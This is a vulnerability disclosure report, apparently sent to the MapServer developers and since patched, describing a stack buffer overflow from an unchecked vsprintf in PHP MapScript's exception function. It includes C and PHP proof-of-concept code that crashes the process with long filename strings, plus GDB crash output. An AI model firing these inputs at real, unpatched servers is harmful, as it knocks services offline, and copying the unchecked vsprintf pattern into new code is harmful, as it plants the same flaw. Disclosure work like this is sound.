

>This is one of the reports that I sent privately to the MapServer Development Team in *Feb/28th/2020* The issues were patched: https://github.com/mapserver/mapserver/issues/6014

# Stack-Based Buffer Overflow in mapscript_throw_mapserver_exception()

Spotted a stack-based Buffer Overflow when throwing PHP error messages using ``mapscript_throw_mapserver_exception()``.

## PoC 
from [mapserver/mapscript/php/mapscript_error.c](https://github.com/mapserver/mapserver/blob/368d71155fcddc7ba250cdad8821541f4d61619e/mapscript/php/mapscript_error.c)
```c
#if  PHP_VERSION_ID >= 70000
zend_object* mapscript_throw_mapserver_exception(char *format TSRMLS_DC, ...)
#else
zval* mapscript_throw_mapserver_exception(char *format TSRMLS_DC, ...)
#endif
{
  va_list args;
  char message[MAX_EXCEPTION_MSG];
/*...more code..*/
  va_start(args, format);
  vsprintf(message, format, args);
  va_end(args);
```

There is no size check on the ``format`` char array before copying it into ``message``.
This means that if the ``format`` string is bigger than ``MAX_EXCEPTION_MSG`` (=256 bytes) a classic stack-based buffer overflow will occur. 

Example:
```c
char payload[999];
memset(payload,'A',998);
mapscript_throw_mapserver_exception(payload);
```
will cause a crash 

## Attack Scenario
So our entry point is the error string parameter in ``mapscript_throw_mapserver_exception()``

We need to find a MapScript php function that prints a dynamic error (without a fixed length). 
I found ``ms_tokenizemap()`` to be a good candidate for a PoC:

When calling the PHP function ``ms_tokenizemap($filename)`` without a non-existing filename it throws the following error:


(snippet from [mapserver/mapscript/php/php_mapscript.c](https://github.com/mapserver/mapserver/blob/368d71155fcddc7ba250cdad8821541f4d61619e/mapscript/php/php_mapscript.c))
```c
    mapscript_throw_mapserver_exception("Failed tokenizing map file %s" TSRMLS_CC, filename);
```
PHP Output:
```
PHP Fatal error:  Uncaught exception ... 'Failed tokenizing map file <PAYLOAD_IS_REFLECTED_HERE>' in ...
```
The ``format`` parameter (from the PoC showed in the beginning) is dynamic and its length is determined by the ``$filename`` PHP variable.
If the filename will make the error's length to be greater than 256 bytes, an overflow will occur.
```php
<?php
$payload = str_repeat('A',99999); // this malicious string can come from any other un-trusted source, such as $_POST[] / $_GET[] / etc.
ms_tokenizemap($payload);
?>
```
After running the code above, the PHP process crashed.

The output from GDB can be found below.

### GDB Output

```
*** buffer overflow detected ***: /usr/bin/php terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x68fce)[0xb789afce]
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x6b)[0xb793003b]
/lib/i386-linux-gnu/libc.so.6(+0xfceca)[0xb792eeca]
/lib/i386-linux-gnu/libc.so.6(+0xfc628)[0xb792e628]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x8e)[0xb78a2d9e]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x357a)[0xb7878d8a]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xb1)[0xb792e6e1]
/usr/lib/php5/20121212+lfs/php_mapscript.so(mapscript_throw_mapserver_exception+0xa9)[0xb3a5b049]
/usr/lib/php5/20121212+lfs/php_mapscript.so(zif_ms_tokenizeMap+0x12e)[0xb3a835de]
/usr/bin/php(execute_internal+0x82)[0x8413672]
/usr/bin/php(dtrace_execute_internal+0x47)[0x834df67]
/usr/bin/php[0x841714d]
/usr/bin/php(execute_ex+0x47)[0x838b127]
/usr/bin/php(dtrace_execute_ex+0x6d)[0x834de5d]
/usr/bin/php(zend_execute+0x1c5)[0x8415225]
/usr/bin/php(zend_eval_stringl+0x29c)[0x835217c]
/usr/bin/php(zend_eval_stringl_ex+0x33)[0x83522c3]
/usr/bin/php(zend_eval_string_ex+0x40)[0x8352340]
/usr/bin/php[0x8419111]
/usr/bin/php(main+0x527)[0x8098ff7]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb784baf3]
/usr/bin/php[0x8099082]
======= Memory map: ========
08048000-08876000 r-xp 00000000 08:01 919750     /usr/bin/php5
08876000-088d7000 r--p 0082d000 08:01 919750     /usr/bin/php5
088d7000-088de000 rw-p 0088e000 08:01 919750     /usr/bin/php5
088de000-0907d000 rw-p 00000000 00:00 0          [heap]
aff08000-aff1c000 r-xp 00000000 08:01 920409     /usr/lib/i386-linux-gnu/libexslt.so.0.8.17
/*....*/
b702b000-b702c000 r--p 00009000 08:01 919747     /usr/lib/i386-linux-gnu/libkrb5support.so.0.1
b702c000-b702d000 rw-p 0000a000 08:01 919747     /usr/lib/i386-linux-gnu/libkrb5support.so.0.1
b702d000-b7030000 r-xp 00000000 08:01 394120     /lib/i386-linux-gnu/libcom_err.so.2.1
Program received signal SIGABRT, Aborted.
0xb7fdd424 in __kernel_vsyscall ()
```


## Important Note
* This affect not only the ``ms_tokenizemap()`` PHP function, it affects all of the functions that throws errors with dynamic length. More examples:
```php
<?php
ms_newshapefileobj(str_repeat('A',99999));
ms_newmapobj(str_repeat('A',99999));
ms_tokenizemap(str_repeat('A',99999));
?>
```
which makes the attack surface even bigger.

 